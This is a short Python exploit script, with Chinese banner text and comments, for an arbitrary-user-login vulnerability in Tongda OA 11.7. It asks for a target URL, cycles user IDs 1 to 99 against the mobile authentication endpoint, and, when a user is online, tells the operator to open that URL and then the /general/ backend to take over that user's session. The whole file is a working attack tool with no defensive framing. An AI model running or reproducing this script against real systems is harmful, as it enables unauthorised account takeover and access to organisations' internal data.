import requests
import sys
import time

def title():
    print('+**********************************************************************+')
    print('+****************     【  TongdaOA任意用户登录   】   *******************+')
    print('+****************     【   版本：通达OA 11.7    】    ********************+')
    print('+****************     【Use:python3 tongdaOA.py】    ********************+')
    print('+****************【url： http://xxx.xxx.xxx.xxx:port】*******************+')
    print('+***********************************************************************+')


def Target_URL(target_url,uid):
     #测试是否存在漏洞的URL地址，同时遍历UID查询在线的用户
    url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=%d&P_VER=0" %(uid)
    manage = target_url + "/general/"

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0",
    }
    print('+**************************************************************************************+')
    print(url)
    try:
        response = requests.get(url=url, headers=headers)
        if "RELOGIN" in response.text and response.status_code == 200:
            print("目标用户为离线状态")
            print('+**************************************************************************************+')
            print()

        elif response.status_code == 200 and response.text == "":
            print("目标用户为在线状态,请先访问:%s后"%url)
            print("再访问:%s 进入后台"%manage)
            print('+**************************************************************************************+')
            sys.exit(0)

        else:
            print("未知错误，目标可能不存在或不存在该漏洞")
    except Exception as e:
        print("请求失败,无法建立有效连接")
        print('+*****************************************************************************************+')
        # 终止程序   os._exit(0)--关闭整个shell
        sys.exit(0)



if __name__ == '__main__':
    title()
    target_url = str(input("+*【请输入URL】*+:"))
    print()
    #遍历UID值 范围可以自己修改
    for i in range(1,100):
        uid=i
        # time.sleep(1)
        Target_URL(target_url,uid)
